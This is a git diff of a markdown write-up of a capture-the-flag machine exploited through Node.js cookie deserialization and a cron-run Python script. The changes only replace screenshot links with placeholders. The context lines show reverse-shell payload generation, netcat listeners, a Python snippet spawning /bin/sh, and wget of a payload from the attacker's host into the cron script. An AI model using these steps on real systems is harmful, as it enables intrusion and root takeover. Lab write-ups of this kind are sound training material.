@@ -23,11 +23,11 @@ sudo nmap -p- --min-rate 1000 -sT -vvv $target
 sudo nmap -sC -sV -p 3000 -T4 $target
 ```
 
-<img width="480" height="270" alt="image" src="https://github.com/user-attachments/assets/52e5129b-626b-41b0-9808-01c78c4fc49b" />
+<img width="480" height="270" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="830" height="482" alt="image" src="https://github.com/user-attachments/assets/2104929e-40d9-43d0-9c71-59297958e1b9" />
+<img width="830" height="482" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
-<img width="809" height="295" alt="image" src="https://github.com/user-attachments/assets/fe555e50-990a-4f61-a832-ca0c7a12f56f" />
+<img width="809" height="295" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Scan Results:**
 - **Port 3000/tcp**: HTTP service running Node.js Express framework
@@ -37,7 +37,7 @@ sudo nmap -sC -sV -p 3000 -T4 $target
 
 Visiting `http://10.129.228.94:3000/` reveals a simple web application that processes user information through serialized cookies.
 
-<img width="809" height="295" alt="image" src="https://github.com/user-attachments/assets/2a254eb9-4ce6-4e78-b6bb-0a5b35e8b248" />
+<img width="809" height="295" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 
 ## 🕵️ Vulnerability Analysis
@@ -48,11 +48,11 @@ The application uses base64-encoded serialized cookies for session management:
 
 **Original Cookie Analysis:**
 
-<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/5358a960-77e0-481e-9e85-5e5e1ddf9f08" />
+<img width="586" height="423" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
-<img width="586" height="423" alt="image" src="https://github.com/user-attachments/assets/108de907-75ad-4a48-8424-4b971f079fd7" />
+<img width="586" height="423" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
-<img width="337" height="458" alt="image" src="https://github.com/user-attachments/assets/8a3706a7-0f2d-49c7-bd0a-92c49d72adc9" />
+<img width="337" height="458" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 
 ```bash
@@ -71,9 +71,9 @@ Modifying the cookie values directly affects application output, confirming inse
 {"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"4444"}
 ```
 
-<img width="957" height="478" alt="image" src="https://github.com/user-attachments/assets/1947b329-c9f4-4e19-89bc-23474d406ece" />
+<img width="957" height="478" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
-<img width="422" height="417" alt="image" src="https://github.com/user-attachments/assets/f42e797a-e23b-4f11-a3e7-51ceb3cd0c84" />
+<img width="422" height="417" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 
 **Response:** "admin4444" confirms the application deserializes and executes user-controlled data.
@@ -93,7 +93,7 @@ npm install node-serialize
 wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py
 ```
 
-<img width="616" height="200" alt="image" src="https://github.com/user-attachments/assets/3ccf1684-0850-4c5d-82b3-bfecdb6e5536" />
+<img width="616" height="200" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ### Payload Generation
 
@@ -102,7 +102,7 @@ wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/maste
 python2 nodejsshell.py 10.10.14.89 4444
 ```
 
-<img width="966" height="517" alt="image" src="https://github.com/user-attachments/assets/cf7f03e2-ac5d-46be-b639-2ca99038a5ae" />
+<img width="966" height="517" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 
 **Step 2: Create exploit script (log.js)**
@@ -122,7 +122,7 @@ console.log("Serialized: \n" + serialize.serialize(y));
 node log.js
 ```
 
-<img width="966" height="517" alt="image" src="https://github.com/user-attachments/assets/24f858e1-93ab-4175-beab-aee445533091" />
+<img width="966" height="517" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 
 **Step 4: Add invocation parentheses** - Critical step to ensure function execution during deserialization.
@@ -138,7 +138,7 @@ The crafted malicious cookie payload is:
 ```bash
 nc -nlvp 4444
 ```
-<img width="953" height="353" alt="image" src="https://github.com/user-attachments/assets/2b8435bf-70df-4afb-9b24-3b20a4dd71f9" />
+<img width="953" height="353" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 
 ### Initial Access
@@ -160,7 +160,7 @@ cat user.txt
 cat /var/log/syslog | grep -i "CRON"
 ```
 
-<img width="1920" height="420" alt="image" src="https://github.com/user-attachments/assets/853aec91-3ec2-4a2d-b526-e4959433c593" />
+<img width="1920" height="420" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 
 **Discovery:**
@@ -193,7 +193,7 @@ p=subprocess.call(["/bin/sh","-i"])
 python3 -m http.server 80
 ```
 
-<img width="956" height="226" alt="image" src="https://github.com/user-attachments/assets/d3b44720-4819-4bae-a446-fcb9bad0e370" />
+<img width="956" height="226" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Step 3: Replace existing script**
 ```bash
@@ -203,7 +203,7 @@ wget 10.10.14.89/s.py
 mv s.py script.py
 ```
 
-<img width="612" height="289" alt="image" src="https://github.com/user-attachments/assets/fad75855-a997-4778-89b2-742cd9c037b1" />
+<img width="612" height="289" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 
 **Step 4: Set up listener**
@@ -211,7 +211,7 @@ mv s.py script.py
 nc -nlvp 9001
 ```
 
-<img width="463" height="140" alt="image" src="https://github.com/user-attachments/assets/f9836631-0c3e-41f0-96fa-42ee73238000" />
+<img width="463" height="140" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 ### Root Access
 
@@ -230,7 +230,7 @@ cat /root/root.txt
 38ba1e10e076213df5db26d1fc5fe7aa
 ```
 
-<img width="825" height="852" alt="image" src="https://github.com/user-attachments/assets/815c326c-7c25-4d5e-96c8-52b3da74e8d0" />
+<img width="825" height="852" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 ## 🎓 Lessons Learned
 
